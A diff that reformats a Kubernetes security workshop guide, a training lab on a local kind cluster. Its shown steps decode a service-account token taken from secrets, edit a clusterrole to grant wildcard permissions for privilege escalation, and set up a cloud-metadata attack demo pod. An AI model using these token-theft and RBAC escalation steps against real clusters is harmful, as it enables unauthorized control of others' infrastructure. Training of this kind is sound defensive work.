@@ -978,12 +978,14 @@ kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND
 > Replace `[RAND]` above with the random token string from the same account displayed in the command you rand before.
 
 Paste the token field from the json output into this command where it says `[TOKEN]`.
+
 ```
 export TOKEN=`echo [TOKEN] | base64 -d`
 ```
 Now the token is stored decoded inside an environment variable.
 
 If you want to see what it looks like decoded simply type:
+
 ```
 echo $TOKEN
 ```
@@ -993,17 +995,21 @@ You should recognize the eyJ at the beginning.
 ### Slide 142 - RBAC - Privilege Escalation (lab)
 
 Use the token we took from the secrets to execute commands on the cluster, and see what it can do.
+
 ```
 kubectl  --token="$TOKEN" get clusterroles
 ```
+
 It can't do much either...
 
 Seems one of the things we can do is edit clusterroles, let's edit the roles for the account of the token we stole.
+
 ```
 kubectl edit clusterrole system:controller:clusterrole-aggregation-controller --token="$TOKEN"
 ```
 
 This command loaded a policy in vi, go to the bottom of the policy and look for the rules section, you'll want to add/replace the APIGroups, resources, and verbs with the following.
+
 ```
 - apiGroups:
   - '*'
@@ -1037,22 +1043,33 @@ We've taken two service accounts with heavily restricted roles, but had just eno
 ### Slide 145 - RBAC - Privilege Escalation (Clean up)
 
 Need to exit out of the pod session and the client container.
-```exit```
 
-```exit```
+```
+exit
+```
+
+```
+exit
+```
 
 Now back at your host machine prompt
 
-```kind delete cluster --name sshgs```
+```
+kind delete cluster --name sshgs
+```
 
-```kind get clusters```
+```
+kind get clusters
+```
+
 Should only see the lab cluster running.
 
->**Note:** The attacker machine container stopped when you exited it, you could remove it if you really want to clean that up to, but no real reason to.
+>**Note:** The attacker machine container stopped when you exited it, you could remove it if you really want to clean that up to, but there is no real reason to.
 
 ### Slide 152 - Demo: Cloud Metadata attacks
 
 Execute a pod in our lab with heavily restricted permissions.
+
 ```
 kubectl apply -f \
 https://raw.githubusercontent.com/digital-shokunin/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml \
@@ -1104,21 +1121,25 @@ kubectl get replicasets -n sock-shop
 ### Slide 177 - Accessing services running in containers
 
 Start up web service, but don't expose externally (e.g. `-p 80:80`), only expose locally on bridge interface
+
 ```
 docker run --name=netwebserver -d nginx
 ```
 
 Get the IP of the bridge interface
+
 ```
 docker inspect -f "{{ .NetworkSettings.IPAddress }}" netwebserver 
 ```
 
 Access service from host machine thru bridge interface
+
 ```
 curl http://[IP]
 ```
 
 Clean up 
+
 ```
 docker stop netwebserver
 ```
@@ -1130,6 +1151,7 @@ kubectl run -it shell-container --image=alpine/curl:3.14 /bin/ash --namespace la
 ```
 
 Get IP from pod description
+
 ```
 curl http:\\[IP]
 ```
